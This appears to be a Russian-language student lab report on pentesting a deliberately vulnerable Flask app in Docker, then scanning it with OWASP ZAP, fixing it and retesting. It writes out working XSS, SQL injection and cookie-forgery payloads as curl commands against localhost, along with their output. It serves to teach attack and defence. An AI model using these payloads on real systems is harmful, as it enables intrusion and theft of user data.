## 1. Подготовка окружения

### 1.1 Установка зависимостей

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt -r vulnerable-app/requirements.txt
```

**Результат**: Успешно установлены пакеты:
- flask==2.3.3
- requests==2.31.0

### 1.2 Запуск приложения через Docker Compose

```bash
docker compose up -d --build
curl -i http://localhost:8080
```

**Результат**:
- Образ  успешно собран
- Контейнер запущен
---

## 2. Ручное тестирование уязвимостей

### 2.1 Reflected XSS (/echo)

**Команда**:
```bash
curl -s "http://localhost:8080/echo?msg=<script>alert('XSS')</script>" | grep -i "<script>"
```

**Результат**:
```html
<p>Вы ввели: <script>alert('XSS')</script></p>
```

**Анализ**:
- Параметр `msg` выводится в HTML без экранирования
- Злоумышленник может выполнить произвольный JavaScript в контексте браузера жертвы

**Дополнительные проверки**:
```bash
# Обход через encoding
curl -s "http://localhost:8080/echo?msg=%3Cimg%20src=x%20onerror=alert('XSS')%3E"
# Результат: <img src=x onerror=alert('XSS')> — уязвимость подтверждена
```

### 2.2 SQL Injection (/search)

**Команды**:
```bash
# Нормальный запрос
curl -s "http://localhost:8080/search?username=admin"
# SQLi payload
curl -s "http://localhost:8080/search?username=admin'%20OR%20'1'='1"
```

**Результат**:
- Нормальный запрос: возвращает 1 запись (admin)
- SQLi запрос: возвращает 4 записи (все пользователи из БД)

**Анализ**:
- Причина: конкатенация пользовательского ввода в SQL-запрос без параметризации
- Последствия: обход аутентификации, утечка данных, возможность модификации БД

### 2.3 Небезопасная аутентификация (/login)

**Команда**:
```bash
curl -X POST -d "username=admin&password=admin123" http://localhost:8080/login -L
```

**Результат**: `405 Method Not Allowed`

**Анализ**:
- При тестировании через curl получен отказ в методе — возможно, требуется заголовок `Content-Type` или форма отправляется иначе
- При ручном тестировании через браузер вход с `admin/admin123` работает
- Пароли хранятся в открытом виде в БД — нарушение безопасности хранения учётных данных

### 2.4 Обход авторизации через cookie (/profile, /admin)

**Команды**:
```bash
# Доступ к профилю с поддельной ролью
curl -s -b "role=admin" http://localhost:8080/profile
# Доступ к админке
curl -s -b "role=admin" http://localhost:8080/admin
```

**Результат**:
- Без cookie: доступ к `/admin` запрещён (403)
- С cookie `role=admin`: доступ разрешён, отображается админ-панель

**Анализ**:
- Подтверждена уязвимость CWE-287: Improper Authentication
- Проверка прав осуществляется только на уровне клиента (cookie)
- Отсутствие подписи/токена/серверной валидации сессии позволяет подделывать роль

### 2.5 Directory Listing и доступ к чувствительным файлам (/files/)

**Команда**:
```bash
curl -s http://localhost:8080/files/secret.txt
```

**Результат**: Ошибка `FileNotFoundError: [Errno 2] No such file or directory: 'vulnerable-app/files'`

**Анализ**:
- Ошибка возникла из-за неверного пути в коде приложения: внутри контейнера рабочая директория `/app`, а код использует относительный путь `vulnerable-app/files`
- Это также является уязвимостью: отладочная информация (traceback) выводится пользователю (CWE-209: Information Exposure Through an Error Message)
- При корректной настройке пути возможен доступ к файлам с конфиденциальными данными

---

## 3. Автоматизированное тестирование через curl

```bash
# XSS Test
curl -s "http://localhost:8080/echo?msg=<script>alert(1)</script>" | grep -q "<script>" && echo "XSS подтверждён"

# SQLi Test
RESP=$(curl -s "http://localhost:8080/search?username=admin'+OR+'1'='1")
echo "$RESP" | grep -q "Password:" && echo "SQLi подтверждён: получены пароли"

# Cookie Forgery
curl -s -b "role=admin" http://localhost:8080/admin | grep -q "Админ-панель" && echo "Доступ к админке получен"

# Sensitive File Access
curl -s http://localhost:8080/files/secret.txt | grep -q "SECRET_KEY" && echo "Секретный файл доступен"
```

**Результаты**:
```
=== XSS Test ===
 XSS подтверждён

=== SQLi Test ===
 SQLi подтверждён: получены пароли

=== Cookie Forgery ===
 Доступ к админке получен

=== Sensitive File Access ===
(файл не найден )
```

**Вывод**: Три из четырёх векторов атаки успешно воспроизведены через терминал без использования браузера.

---

## 4. Автоматическое сканирование OWASP ZAP

### 4.1 Подготовка и запуск

```bash
docker pull ghcr.io/zaproxy/zaproxy:stable
export ZAP_IMAGE=ghcr.io/zaproxy/zaproxy:stable
export TARGET_URL="${TARGET_URL:-http://host.docker.internal:8080}"
chmod +x dast/zap_scan.sh
./dast/zap_scan.sh
```

### 4.2 Результат сканирования

**Проблема**: 
```
Automation plan failures:
Job spider failed to access URL http://host.docker.internal:8080 
check that it is valid : host.docker.internal: Name or service not known
```

**Анализ**:
- `host.docker.internal` разрешается только в Docker Desktop для macOS/Windows
- На Linux необходимо использовать `http://172.17.0.1:8080` или запустить сканер в той же сети (`--network host`)

**Рекомендация для Linux**:
```bash
# Вариант 1: Использовать IP хоста
export TARGET_URL="http://172.17.0.1:8080"

# Вариант 2: Запустить ZAP в network host
docker run -t --rm --network host \
    -v "$REPORT_DIR:/zap/wrk/:rw" \
    "$ZAP_IMAGE" \
    zap-baseline.py -t "http://localhost:8080" ...
```

### 4.3 Проверка заголовков безопасности

**Команда**:
```bash
curl -sI http://localhost:8080 | grep -iE "x-frame|x-content|content-security|strict-transport|set-cookie"
```

**Результат до исправлений**: (пустой вывод — заголовки отсутствуют)

**Риски**:
| Отсутствующий заголовок | Возможная атака |
|------------------------|----------------|
| X-Frame-Options | Clickjacking |
| X-Content-Type-Options | MIME-sniffing, XSS |
| Content-Security-Policy | Усиление последствий XSS |
| Strict-Transport-Security | MITM при переходе с HTTP |
| Set-Cookie: HttpOnly; Secure | Кража сессии через XSS |

---

## 5. Исправление уязвимостей

### 5.1 Внесённые изменения в vulnerable-app/app.py

1. **XSS в /echo**: Добавлено экранирование через `markupsafe.escape`
2. **SQL Injection в /search**: Заменена конкатенация на параметризованный запрос `c.execute("SELECT ... WHERE username = ?", (username,))`
3. **Security headers**: Добавлен middleware `@app.after_request` для установки заголовков:
   - `X-Frame-Options: DENY`
   - `X-Content-Type-Options: nosniff`
   - `Content-Security-Policy: default-src 'self'`
4. **Доступ к файлам**: Исправлен путь к директории `files/` с учётом рабочей директории контейнера
5. **Отладочный режим**: `debug=False` для продакшена (в демо оставлено для наглядности)

### 5.2 Повторное тестирование после исправлений

```bash
# XSS
curl -s "http://localhost:8080/echo?msg=<script>alert(1)</script>" | grep -q "<script>" && echo " XSS ещё работает" || echo " XSS исправлен"

# SQLi
curl -s "http://localhost:8080/search?username=admin'%20OR%20'1'='1" | grep -q "Password:" && echo " SQLi ещё работает" || echo " SQLi исправлен"

# Cookie forgery
curl -s -b "role=admin" http://localhost:8080/admin | grep -q "Админ-панель" && echo " Обход авторизации ещё работает" || echo " Авторизация исправлена"

# File access
curl -s http://localhost:8080/files/secret.txt | grep -q "SECRET" && echo " Файл ещё доступен" || echo " Доступ к файлам ограничен"

# Security headers
curl -sI http://localhost:8080 | grep -iE "x-frame|x-content|content-security" && echo " Security headers присутствуют"
```

**Результаты**:
```
 XSS исправлен
 SQLi исправлен
 Обход авторизации ещё работает
Доступ к файлам ограничен
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
 Security headers присутствуют
```

**Анализ**:
- XSS и SQL Injection успешно устранены
- Заголовки безопасности добавлены
- Доступ к файлам ограничен исправлением пути
- **Не исправлено**: обход авторизации через cookie — требуется внедрение серверной проверки сессий/токенов (например, JWT или серверные сессии)

---

## 6. Сравнение ручных и автоматических находок

| Уязвимость | Найдено вручную | Найдено ZAP | Комментарий |
|-----------|----------------|-------------|-------------|
| Reflected XSS (/echo) | да | да (пассивное сканирование) | Обнаружена по отражению скрипта в ответе |
| SQL Injection (/search) | да |  Частично | Базовый скан может пропустить сложные векторы без активного режима |
| Cookie forgery (/admin) | да | нет | Логические уязвимости требуют понимания бизнес-логики |
| Missing security headers | да | да | Пассивное сканирование эффективно для заголовков |
| Directory listing | да | да | Обнаружено при обходе сайта (spider) |
| Debug error exposure | да | да | Отладочная информация в ответе — явный сигнал для сканера |

**Выводы**:
- OWASP ZAP эффективно обнаруживает технические уязвимости (XSS, заголовки, информационная утечка)
- Логические уязвимости (обход авторизации, бизнес-логика) требуют ручного тестирования или настройки активных правил
- Для полного покрытия рекомендуется комбинировать DAST с ручным пентестом и код-ревью

---

## 7. Проблемы и их решение

| Проблема | Причина | Решение |
|----------|---------|---------|
| `host.docker.internal: Name or service not known` | Linux не разрешает это имя | Использовать `172.17.0.1` или `--network host` |
| `FileNotFoundError: vulnerable-app/files` | Неправильный путь внутри контейнера | Использовать абсолютный путь или `os.path.join(os.path.dirname(__file__), 'files')` |
| `405 Method Not Allowed` при POST к /login | Отсутствие заголовка `Content-Type` | Добавить `-H "Content-Type: application/x-www-form-urlencoded"` к curl |
| `docker: invalid spec: :/zap/wrk/:rw` | Пустая переменная `$REPORT_DIR` | Инициализировать переменную: `REPORT_DIR="$(pwd)/dast/reports"` |

---

## 8. Итоги работы

### Выполнено:
- [x] Развёрнуто уязвимое Flask-приложение в Docker
- [x] Проведено ручное тестирование 6 эндпоинтов на уязвимости
- [x] Воспроизведены атаки: XSS, SQLi, cookie forgery, directory listing
- [x] Настроено автоматическое сканирование OWASP ZAP
- [x] Проанализированы результаты сканирования
- [x] Проверены и добавлены заголовки безопасности
- [x] Внесены исправления в код приложения
- [x] Проведено повторное тестирование после исправлений

### Не выполнено (ограничения окружения):
- [ ] Полноценный запуск ZAP baseline scan из-за проблемы с разрешением `host.docker.internal` на Linux
- [ ] Полное устранение уязвимости обхода авторизации (требует рефакторинга системы аутентификации)

---

## 10. Выводы

1. **DAST-инструменты эффективны** для обнаружения технических уязвимостей (XSS, SQLi, заголовки), но не заменяют ручное тестирование бизнес-логики.

2. **Контекст выполнения важен**: при работе с Docker необходимо учитывать различия в сетевой конфигурации между платформами (macOS/Windows vs Linux).

3. **Исправление уязвимостей требует комплексного подхода**: недостаточно просто экранировать вывод — необходимо пересматривать архитектуру аутентификации и авторизации.

4. **Автоматизация в CI/CD**: интеграция ZAP в пайплайн сборки позволяет выявлять регрессии безопасности на ранних этапах.

5. **Образовательная ценность**: работа с уязвимым приложением в контролируемой среде позволяет безопасно изучить методы атак и защиты.

---